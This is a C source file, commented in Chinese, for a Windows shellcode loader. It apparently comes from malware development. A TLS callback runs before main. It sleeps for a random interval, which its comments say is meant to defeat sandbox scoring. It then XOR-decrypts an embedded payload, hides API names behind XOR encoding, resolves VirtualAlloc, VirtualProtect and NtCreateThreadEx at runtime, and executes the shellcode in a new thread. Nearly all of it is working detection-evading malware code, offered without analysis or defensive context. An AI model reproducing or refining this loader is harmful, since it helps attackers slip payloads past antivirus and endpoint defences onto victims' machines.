#include <windows.h>
#include <winnt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "enc_shellcode.h"

static void xor_dec(unsigned char *p, unsigned int n, unsigned char k)
{
    for (unsigned int i = 0; i < n; ++i) p[i] ^= k;
}

/* ⇩ 仍沿用你原来的自写 resolve() —— 这里保持不变 ⇩ */
FARPROC resolve(LPCSTR dll, LPCSTR func)
{
    HMODULE h = LoadLibraryA(dll);
    return h ? GetProcAddress(h, func) : NULL;
}

/* TLS 回调：进程一附着即解密 + 执行 */
void NTAPI tls_cb(PVOID h, DWORD reason, PVOID reserved)
{
    if (reason != DLL_PROCESS_ATTACH) return;

    /* ❶ 随机短 Sleep，降低沙箱评分 */
    Sleep((GetTickCount() & 0x7FF) % 2000 + 1000);

    xor_dec(shellcode, shellcode_len, XOR_KEY);                      // ← 用新的随机 key

    /* 以下与旧版一致，只改了字符串硬编码→本地数组 XOR 破形 */
    const char k32[] = { 'k'^6,'e'^6,'r'^6,'n'^6,'e'^6,'l'^6,'3'^6,'2'^6,'.'^6,'d'^6,'l'^6,'l'^6,0 };
    const char ntd[] = { 'n'^6,'t'^6,'d'^6,'l'^6,'l'^6,'.'^6,'d'^6,'l'^6,'l'^6,0 };
    const char va [] = { 'V'^6,'i'^6,'r'^6,'t'^6,'u'^6,'a'^6,'l'^6,'A'^6,'l'^6,'l'^6,'o'^6,'c'^6,0 };
    const char vp [] = { 'V'^6,'i'^6,'r'^6,'t'^6,'u'^6,'a'^6,'l'^6,'P'^6,'r'^6,'o'^6,'t'^6,'e'^6,'c'^6,'t'^6,0 };
    const char nt [] = { 'N'^6,'t'^6,'C'^6,'r'^6,'e'^6,'a'^6,'t'^6,'e'^6,'T'^6,'h'^6,'r'^6,'e'^6,'a'^6,'d'^6,'E'^6,'x'^6,0 };
    const char wf [] = { 'W'^6,'a'^6,'i'^6,'t'^6,'F'^6,'o'^6,'r'^6,'S'^6,'i'^6,'n'^6,'g'^6,'l'^6,'e'^6,'O'^6,'b'^6,'j'^6,'e'^6,'c'^6,'t'^6,0 };

    /* 简单一次性解码字符串 */
    for (char *p = (char*)k32; *p; ++p) *p ^= 6;
    for (char *p = (char*)ntd; *p; ++p) *p ^= 6;
    for (char *p = (char*)va ; *p; ++p) *p ^= 6;
    for (char *p = (char*)vp ; *p; ++p) *p ^= 6;
    for (char *p = (char*)nt ; *p; ++p) *p ^= 6;
    for (char *p = (char*)wf ; *p; ++p) *p ^= 6;

    LPVOID (WINAPI *pVirtualAlloc)(LPVOID,SIZE_T,DWORD,DWORD) =
        (LPVOID(WINAPI*)(LPVOID,SIZE_T,DWORD,DWORD))resolve(k32, va);
    BOOL   (WINAPI *pVirtualProtect)(LPVOID,SIZE_T,DWORD,PDWORD) =
        (BOOL  (WINAPI*)(LPVOID,SIZE_T,DWORD,PDWORD))resolve(k32, vp);
    NTSTATUS (WINAPI *pNtCreateThreadEx)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,
        LPTHREAD_START_ROUTINE,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID) =
        (NTSTATUS (WINAPI*)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,
            LPTHREAD_START_ROUTINE,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID))resolve(ntd, nt);
    DWORD (WINAPI *pWaitForSingleObject)(HANDLE,DWORD) =
        (DWORD (WINAPI*)(HANDLE,DWORD))resolve(k32, wf);

    LPVOID addr = pVirtualAlloc(NULL, shellcode_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!addr) return;

    memcpy(addr, shellcode, shellcode_len);
    DWORD old = 0;
    pVirtualProtect(addr, shellcode_len, PAGE_EXECUTE_READ, &old);

    HANDLE hThread;
    pNtCreateThreadEx(&hThread, 0x1FFFFF, NULL, (HANDLE)-1,
                      (LPTHREAD_START_ROUTINE)addr, NULL, 0, 0, 0, 0, NULL);

    if (hThread) {
        pWaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
}

/* TLS 区注册 */
#ifdef _MSC_VER
# pragma comment(linker, "/INCLUDE:__tls_used")
# pragma comment(linker, "/INCLUDE:_tls_cb")
PIMAGE_TLS_CALLBACK _tls_cb = tls_cb;
#else
__attribute__((section(".CRT$XLB"))) PIMAGE_TLS_CALLBACK _tls_cb = tls_cb;
#endif

int main(void) { return 0; }   /* 永不到达 */
